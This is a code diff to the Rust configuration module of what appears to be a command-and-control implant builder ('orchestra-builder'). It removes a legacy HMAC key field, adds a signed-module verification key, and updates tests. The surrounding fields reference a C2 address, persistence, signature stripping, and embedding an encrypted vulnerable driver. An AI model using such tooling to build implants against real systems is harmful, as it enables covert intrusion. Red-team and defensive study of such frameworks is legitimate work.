@@ -25,10 +25,6 @@ pub struct PayloadConfig {
     /// Either a base64-encoded 32-byte AES key, or `file:/path/to/key.bin`
     /// (the file is read at build time). Used to encrypt the payload binary.
     pub encryption_key: String,
-    /// Legacy profile field from the previous HMAC design. The current
-    /// payload format uses AES-GCM and does not require a separate HMAC key.
-    #[serde(default)]
-    pub hmac_key: Option<String>,
     /// Pre-shared secret the agent uses for its AES-TCP connection to the
     /// Control Center. Must match `agent_shared_secret` in `orchestra-server.toml`.
     /// Required when `outbound-c` is in `features`. If absent the agent will
@@ -103,6 +99,12 @@ pub struct PayloadConfig {
     /// so the agent doesn't require an `agent.toml` for module loading.
     #[serde(default)]
     pub module_aes_key: Option<String>,
+    /// Optional Ed25519 module verification public key (base64-encoded 32 bytes).
+    /// When set, it is passed to the agent build as `ORCHESTRA_MODULE_VERIFY_KEY`
+    /// so the agent verifies signed modules against the server's signing key
+    /// instead of falling back to the compile-time `MODULE_SIGNING_PUBKEY`.
+    #[serde(default)]
+    pub module_verify_key: Option<String>,
     /// Path to an XOR-encrypted vulnerable driver binary to embed when the
     /// `embedded_driver` Cargo feature is enabled.
     ///
@@ -258,13 +260,6 @@ impl PayloadConfig {
             tracing::warn!(
                 "A configured key appears to be a weak placeholder. \
                  Generate random keys with `orchestra-builder configure`."
-            );
-        }
-
-        if let Some(hmac_key) = &self.hmac_key {
-            validate_legacy_hmac_key(hmac_key)?;
-            tracing::warn!(
-                "profile contains legacy `hmac_key`; the current AES-GCM payload format ignores it"
             );
         }
 
@@ -452,23 +447,6 @@ fn authority_from_address(address: &str) -> Option<&str> {
         .filter(|authority| !authority.is_empty())
 }
 
-fn validate_legacy_hmac_key(hmac_key: &str) -> Result<()> {
-    use base64::Engine;
-    let bytes = if let Some(path) = hmac_key.strip_prefix("file:") {
-        std::fs::read(path).with_context(|| format!("Failed to read key file {path}"))?
-    } else {
-        base64::engine::general_purpose::STANDARD
-            .decode(hmac_key.trim())
-            .context("legacy hmac_key is not valid base64 (or `file:<path>`)")?
-    };
-    if bytes.len() != 32 {
-        return Err(anyhow!(
-            "legacy hmac_key must decode to exactly 32 bytes when present (got {})",
-            bytes.len()
-        ));
-    }
-    Ok(())
-}
 
 /// Check for obviously weak (non-random) keys.
 pub fn is_weak_key(key: &[u8]) -> bool {
@@ -546,7 +524,6 @@ pub fn cmd_configure(name: Option<String>) -> Result<()> {
         target_arch,
         c2_address,
         encryption_key,
-        hmac_key: None,
         c_server_secret,
         server_cert_fingerprint: None,
         features: features.clone(),
@@ -579,6 +556,7 @@ pub fn cmd_configure(name: Option<String>) -> Result<()> {
         strip_signature: true,
         strip_debug: true,
         module_aes_key: None,
+        module_verify_key: None,
         driver_path: None,
     };
     save_profile(&name, &profile)
@@ -592,7 +570,7 @@ pub fn read_agent_features() -> Result<Vec<String>> {
         .join("agent/Cargo.toml");
     let manifest_str = std::fs::read_to_string(&manifest_path)
         .with_context(|| format!("Failed to read {}", manifest_path.display()))?;
-    let manifest: toml::Value = manifest_str.parse()?;
+    let manifest: toml::Value = toml::from_str(&manifest_str)?;
     let features = manifest
         .get("features")
         .and_then(|f| f.as_table())
@@ -673,7 +651,6 @@ mod tests {
             target_arch: "x86_64".to_string(),
             c2_address: "127.0.0.1:8444".to_string(),
             encryption_key: "file:key.bin".to_string(),
-            hmac_key: Some("file:hmac.bin".to_string()),
             c_server_secret: Some("secret".to_string()),
             server_cert_fingerprint: None,
             features: vec!["persistence".to_string()],
@@ -693,6 +670,7 @@ mod tests {
             strip_signature: true,
             strip_debug: true,
             module_aes_key: None,
+            module_verify_key: None,
             driver_path: None,
         };
         let s = toml::to_string(&profile).unwrap();
@@ -708,7 +686,6 @@ mod tests {
             target_arch: "x86_64".to_string(),
             c2_address: "127.0.0.1:8444".to_string(),
             encryption_key: "short".to_string(),
-            hmac_key: None,
             c_server_secret: None,
             server_cert_fingerprint: None,
             features: vec![],
@@ -728,6 +705,7 @@ mod tests {
             strip_signature: true,
             strip_debug: true,
             module_aes_key: None,
+            module_verify_key: None,
             driver_path: None,
         };
         assert!(profile.encryption_key_bytes().is_err());
@@ -744,7 +722,6 @@ features       = []
 package        = "launcher"
 "#;
         let profile: PayloadConfig = toml::from_str(content).unwrap();
-        assert!(profile.hmac_key.is_none());
         assert_eq!(profile.package, "launcher");
         assert_eq!(profile.encryption_key_bytes().unwrap().len(), 32);
     }
@@ -756,7 +733,6 @@ package        = "launcher"
             target_arch: "m68k".to_string(),
             c2_address: "127.0.0.1:8444".to_string(),
             encryption_key: "a".repeat(44), // 32 bytes b64
-            hmac_key: None,
             c_server_secret: None,
             server_cert_fingerprint: None,
             features: vec![],
@@ -776,6 +752,7 @@ package        = "launcher"
             strip_signature: true,
             strip_debug: true,
             module_aes_key: None,
+            module_verify_key: None,
             driver_path: None,
         };
         assert!(profile.target_triple().is_err());
